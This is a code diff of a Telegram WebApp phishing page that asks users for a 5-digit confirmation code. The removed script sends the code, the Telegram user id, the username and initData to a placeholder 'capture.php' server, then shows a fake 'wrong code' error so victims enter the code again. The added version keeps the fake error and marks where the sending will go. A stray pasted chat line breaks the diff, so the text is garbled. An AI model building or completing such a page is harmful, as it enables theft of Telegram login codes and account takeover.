@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -35,6 +36,10 @@
             border-radius: 8px;
             font-size: 16px;
             cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        button:active {
+            opacity: 0.7;
         }
         .warning {
             color: var(--tg-theme-destructive-text-color, #ff3b30);
@@ -49,7 +54,7 @@
 <body>
     <div class="container">
         <h1>Подтверждение перехода</h1>
-        <p>Для продолжения введите код подтверждения, отправленный вам в Telegram</p>
+        <p>Для продолжения введите код подтверждения</p>
         
         <div class="warning" id="warning">
             Неверный код. Попробуйте снова.
@@ -61,48 +66,61 @@
     </div>
 
     <script>
-        // Инициализация Telegram Web App
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand(); // Разворачиваем на весь экран
-        
-        // Получаем данные пользователя (они автоматически передаются Telegram)
-        const initData = tg.initData;
-        const initDataUnsafe = tg.initDataUnsafe;
-        
-        console.log('User data:', initDataUnsafe.user);
-        
-        // Обработчик кнопки
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const code = document.getElementById('codeInput').value;
+        // Дожидаемся полной загрузки страницы
+        document.addEventListener('DOMContentLoaded', function() {
             
-            if (code && code.length === 5) {
-                // Отправляем код на сервер (через fetch)
-                fetch('https://ваш-сервер.com/capture.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        code: code,
-                        user_id: initDataUnsafe.user?.id,
-                        username: initDataUnsafe.user?.username,
-                        initData: initData
-                    })
-                }).then(response => {
-                    if (response.ok) {
-                        // После успешной отправки показываем сообщение об ошибке
-                        // (имитируем неверный код, чтобы пользователь пытался снова)
-                        document.getElementById('warning').style.display = 'block';
-                        document.getElementById('codeInput').value = '';
-                        
-                        // Или можно закрыть приложение
-                        // tg.close();
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                });
+            // Проверяем, доступен ли Telegram WebApp API
+            if (window.Telegram && window.Telegram.WebApp) {
+                console.log("✅ Telegram WebApp API доступен");
+                
+                // ОБЯЗАТЕЛЬНО вызываем ready()
+                window.Telegram.WebApp.ready();
+                
+                // Раскрываем на весь экран
+                window.Telegram.WebApp.expand();
+                
+                console.log("✅ WebApp готов");
+            } else {
+                console.error("❌ Telegram WebApp API НЕ доступен");
+                alert("Ошибка: Telegram WebApp API не загружен");
             }
+            
+            // Получаем элементы
+            const submitBtn = document.getElementById('submitBtn');
+            const codeInput = document.getElementById('codeInput');
+            const warning = document.getElementById('warning');
+            
+            // Проверяем, что элементы найдены
+            if (!submitBtn || !codeInput) {
+                console.error("❌ Элементы не найдены");
+                return;
+            }
+            
+            // Добавляем обработчик клика
+            submitBtn.addEventListener('click', function() {
+                console.log("✅ Кнопка нажата");
+                
+                const code = codeInput.value;
+                
+                if (code && code.length === 5) {
+                    console.log("✅ Код введен:", code);
+                    
+                    // Здесь будет отправка на сервер
+                    alert("Код принят: " + code);
+                    
+                    // Показываем предупреждение (имитация ошибки)
+                    warning.style.display = 'block';
+                    codeInput.value = '';
+                } else {
+                    alert("Введите 5-значный код");
+                }
+            });
+
+Teprov, [25.02.2026 21:37]
+// Добавляем обработчик касания для мобильных устройств
+            submitBtn.addEventListener('touchstart', function(e) {
+                e.preventDefault(); // Предотвращаем двойное срабатывание
+            });
         });
     </script>
 </body>
